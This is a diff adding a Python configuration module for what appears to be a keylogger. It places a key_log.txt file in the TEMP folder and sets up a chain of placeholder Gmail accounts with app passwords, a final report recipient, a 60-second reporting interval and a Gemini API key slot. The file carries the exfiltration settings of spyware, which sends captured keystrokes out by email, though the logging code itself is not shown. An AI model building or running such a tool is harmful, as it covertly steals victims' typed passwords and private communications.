@@ -1,0 +1,23 @@
+"""
+Module: Configuration Settings
+Description: Centralizes credentials for the 3-Email Chain architecture.
+"""
+import os
+
+LOG_FILE = os.path.join(os.getenv('TEMP'), "key_log.txt")
+
+
+RAW_LOG_SENDER = "bot_sender_mail1@gmail.com"
+RAW_LOG_PASSWORD = "mail1_app_password" #Use App Password! Not regular password
+
+
+RAW_LOG_RECEIVER = "bot_receiver_mail2@gmail.com"
+RAW_LOG_RECEIVER_PASSWORD = "mail2_app_password" #Use App Password! Not regular password
+
+
+FINAL_REPORT_RECEIVER = "your_personal_mail3@gmail.com" 
+
+
+SEND_REPORT_EVERY = 60
+
+API_KEY = "YOUR_GEMINI_API_KEY"
